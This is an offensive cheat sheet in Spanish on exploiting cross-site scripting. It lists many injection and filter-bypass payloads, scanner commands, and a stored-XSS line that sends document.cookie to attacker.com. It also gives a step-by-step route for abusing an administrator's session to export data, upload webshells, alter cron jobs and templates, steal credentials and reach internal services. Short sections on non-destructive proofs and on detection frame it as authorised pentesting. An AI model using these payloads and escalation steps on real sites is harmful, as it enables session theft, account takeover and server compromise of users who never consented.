# CheatSheet: Cross-Site Scripting (XSS)

## Objetivo
Identificar y explotar vulnerabilidades de XSS para inyectar scripts maliciosos en aplicaciones web y comprometer la seguridad del usuario o del sistema.

---
## Herramientas
1. Burp Suite
2. XSS Hunter
3. OWASP ZAP

---
## Procedimiento y comandos

1. **Identificar campos vulnerables**:
   - Probar inyección básica en campos de entrada:
     ```
     <script>alert('XSS')</script>
     ```

2. **Probar vectores comunes**:
   - HTML básico:
     ```
     <img src=x onerror=alert('XSS')>
     ```
   - JavaScript embebido:
     ```
     "><script>alert('XSS')</script>
     ```
   - Eventos en atributos:
     ```
     <input onfocus=alert('XSS') autofocus>
     ```

3. **Codificación y bypass de filtros**:
   - Codificación de caracteres:
     ```
     <script>alert&#40;'XSS'&#41;</script>
     ```
   - Uso de SVG o vectores alternativos:
     ```
     <svg onload=alert('XSS')>
     ```

4. **Automatización**: Usar Burp Suite con secuencias de ataque o herramientas como XSS Hunter:
   ```bash
   python xss-finder.py -u http://{HOST}/vulnerable
   ```

5. **Explorar XSS almacenado**:
   - Introducir un payload en campos que almacenen datos como comentarios o perfiles:
     ```
     <script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
     ```

---
## Troubleshooting
1. **Filtros que bloquean caracteres especiales:**
   - Probar codificaciones alternativas como UTF-7:
     ```
     +ADw-script+AD4-alert('XSS')+ADw-/script+AD4-
     ```
   - Escapar filtros con secuencias de caracteres indirectos:
     ```
     <svg><a href="javascript:alert('XSS')">Click</a></svg>
     ```

2. **El navegador bloquea el script:**
   - Analizar si el navegador aplica políticas de seguridad (CSP) y modificar el payload para cumplir con dichas restricciones.

3. **No se ejecuta el código:**
   - Comprobar si el campo de entrada es reflejado en el DOM o directamente en el contenido HTML.
   - Usar herramientas de análisis DOM como el DevTools de Chrome para inspeccionar la página.

---
## Herramientas Alternativas
- [ ] **XSStrike**: Pruebas automatizadas de XSS.
  ```bash
  python3 xsstrike.py -u http://{HOST}/vulnerable
  ```
- [ ] **Dalfox**: Detección rápida y automatizada de XSS.
  ```bash
  dalfox url http://{HOST}/vulnerable
  ```
- [ ] **Nuclei**: Escaneo de plantillas personalizables con soporte para XSS.
  ```bash
  nuclei -u http://{HOST}/vulnerable -t xss-templates
  ```

## Resumen rápido

* **XSS**: ejecución de JavaScript en el contexto del navegador de la víctima.
* **Impacto típico**: robo de sesión, CSRF potenciado, exfiltración de datos, acciones administrativas realizadas por el navegador de la víctima, pivot hacia servicios internos o RCE mediante cadenas de explotación secundarias.

---

## Tipos de XSS (clasificación y relevancia)

1. **Stored (persistente)** — mayor impacto para atacar administradores: el payload se guarda en la app y se ejecuta cuando otro usuario (ej. admin) visita.
2. **Reflected** — útil para spear-phishing o engaños dirigidos (link en correo/messages).
3. **DOM-based** — la vulnerabilidad está en el JS cliente; requiere análisis del DOM y del código front-end.

---

## Pre-checklist (información esencial antes de atacar)

* ¿Mismo origen entre la página vulnerable y el panel admin? (dominio/subdominio/protocolos)
* Flags de cookies: `HttpOnly`, `Secure`, `SameSite`.
* Presencia de **CSP** (script-src, object-src, connect-src).
* ¿Los tokens se almacenan en `localStorage`/`sessionStorage` ó en cookies?
* Endpoints administrativos disponibles (export, import, upload, config, webhooks, jobs, integraciones).
* Políticas de logs y WAF presentes.

---

## Procedimiento paso a paso (cheat-oriented)

### 1) Confirmación y categorizar XSS

* Inyectar token controlado y único (ej: `__XSS_TEST_<ID>__`) para confirmación sin causar daño.
* Determinar si la inyección es **reflected**, **stored** o **DOM**.

### 2) Identificar vectores con mayor probabilidad de impactar a admins

* Campos que se muestran en pantallas que revisan administradores: comentarios, tickets, perfiles, logs, listas de usuarios, descripciones de recursos.
* Endpoints que envían notificaciones internas (p. ej. alertas por email, tickets) — un payload en el texto puede llegar al admin via notificación.

### 3) Forzar ejecución por parte del admin

* **Stored XSS**: dejar el payload en recurso que admins visualicen regularmente.
* **Reflected XSS**: crafting de enlace y spear-phishing (si autorizado por scope), o inyectarlo en un sitio que el admin consulte.
* **DOM XSS**: ubicar la ruta exacta en el código cliente y manipularlo para que el admin ejecute la ruta (ej. mediante parámetros en URLs internas).

### 4) Acciones iniciales desde el navegador de la víctima (post-execución)

*(Todas estas acciones se ejecutan en el contexto del navegador de la víctima y por tanto usan su sesión y permisos)*

* **Automation de requests**: `fetch`/XHR hacia endpoints admin (crear usuario, exportar datos, cambiar configuraciones). Documentar respuestas.
* **Exploración interna**: intentar acceder a endpoints `127.0.0.1`, `localhost`, `http://internal/` desde el navegador de la víctima (para descubrir servicios internos accesibles desde la red del usuario).
* **Buscar upload/import puntos**: invocar funciones de upload del panel para intentar subir un artefacto benigno de prueba.

> *Nota:* Si la cookie es `HttpOnly` no podés leerla con JS, pero sí podés realizar requests autenticados en nombre del admin.

### 5) Rutas típicas de escalada a RCE (indirectas)

* **Upload → Webshell**: usar la sesión admin para subir un archivo (plugin, tema, backup) que pueda ser ejecutado por el servidor.
* **Templates/Renderers**: si la app renderiza plantillas o ejecuta código a partir de entradas administrativas, modificar una plantilla para ejecutar código en servidor.
* **Cambiar integraciones/cron**: crear o modificar un job/cron que ejecute un comando o cargue una URL maliciosa.
* **Exfiltrar credenciales**: forzar al admin a exportar o mostrar credenciales/secret keys y usarlas para acceder al backend.
* **Abusar de endpoints internos**: desde el navegador del admin, alcanzar servicios internos (DB admin panels, Redis, etc.) y explotarlos.

---

## Pruebas no destructivas / PoC seguras (para incluir en reporte)

* Demostrar ejecución: marcar que `__XSS_TEST_<ID>__` aparece en la UI o en logs.
* Forzar una acción administrativa observable no destructiva: p. ej. crear un ticket con título `PoC_XSS_<ID>` o crear un recurso de baja prioridad que demuestre control.
* No subir ejecutables ni webshells sin permiso: en su lugar, subir un archivo `.txt` que contenga la marca de PoC y mostrar que el upload se realiza con permisos admin.

---

## Scripts/plantillas de prueba (seguros)

* Token de confirmación: `__XSS_TEST_2025_01_19__` (usar uno por engagement).
* Ejemplo de script de prueba que hace una petición `GET` a un endpoint de la app (no a terceros):

```js
// PoC inofensivo: pedir al endpoint /api/status para demostrar ejecución
fetch('/api/status')
  .then(r => r.text())
  .then(t => { console.log('__XSS_PoC__', t); })
  .catch(e => console.log('PoC error', e));
```

> Evitar llamadas a servidores externos sin permiso; si necesitás demostrar exfiltración, usar un mecanismo controlado y autorizado por el cliente (p. ej. domain de captura aprobado).

---

## Checklist de escalada (acción/objetivo/resultados esperados)

1. **Stored XSS en recurso que ve admin** → esperar ejecución al abrir → objetivo: ejecutar petición administrativa.
2. **Hacer POST a `/admin/export`** → objetivo: obtener un archivo exportable que confirme acceso.
3. **Intentar upload usando funcionalidad admin** → objetivo: subir archivo de PoC, verificar accesibilidad.
4. **Probar endpoints internos `localhost:PORT`** desde el navegador del admin → objetivo: descubrir servicios accesibles desde la red de la víctima.
5. **Buscar endpoints de gestión de integraciones/cron** → objetivo: inyectar un job benigno que demuestre control.

---

## Detección y logs (qué buscar en entornos defensivos)

* Requests con payloads extraños en campos de comentarios o perfiles.
* Cambios en configuraciones administrativas desde IPs inusuales o cuentas no esperadas.
* Uploads de archivos con extensiones inusuales o con contenido que contenga secuencias `<?php` / `eval(`.
* Accesos a endpoints internos desde navegadores sin correlación directa con admin workflows.

---




